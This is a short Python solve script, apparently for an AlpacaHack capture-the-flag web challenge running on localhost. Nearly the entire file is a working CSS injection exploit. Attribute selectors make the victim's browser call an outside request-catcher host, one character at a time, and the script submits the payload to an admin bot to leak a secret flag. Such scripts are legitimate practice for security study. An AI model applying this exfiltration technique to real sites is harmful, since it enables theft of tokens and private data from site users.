import string
import requests

WEB_URL = "http://localhost:3000"
BOT_URL = "http://localhost:1337"
KNOWN_FLAG = ""
ENDPOINT = "//alpacahack.requestcatcher.com?"


def submit_bot(payload):
    # Report to the bot API
    requests.post(BOT_URL + "/api/report", json={"path": payload})

def create_payload():
    """ Create payload for leaking one character """
    global KNOWN_FLAG

    payload = ""
    # Add each character to the payload
    for char in string.ascii_letters+string.digits+'{'+'}':
        # Example: [data-flag^=Alpaca]{background:url(//alpacahack.requestcatcher.com/?Alpaca);}
        # So if data-flag start with Alpaca, it will ping our endpoint
        # This for each of the possible characters
        payload += '[data-flag^="' + KNOWN_FLAG + char + '"]{background:url(' + ENDPOINT + KNOWN_FLAG + char + ');}'

    return payload 


# Leak char by char
while not KNOWN_FLAG.endswith('}'):
    print(f"Known Flag: '{KNOWN_FLAG}'")
    print(f"[*] Leaking char")
    payload = create_payload()
    url_path = "?artwork=" + payload
    print("\t[+] Submitting to bot")
    submit_bot(url_path)
    KNOWN_FLAG += input("\tleaked char> ")
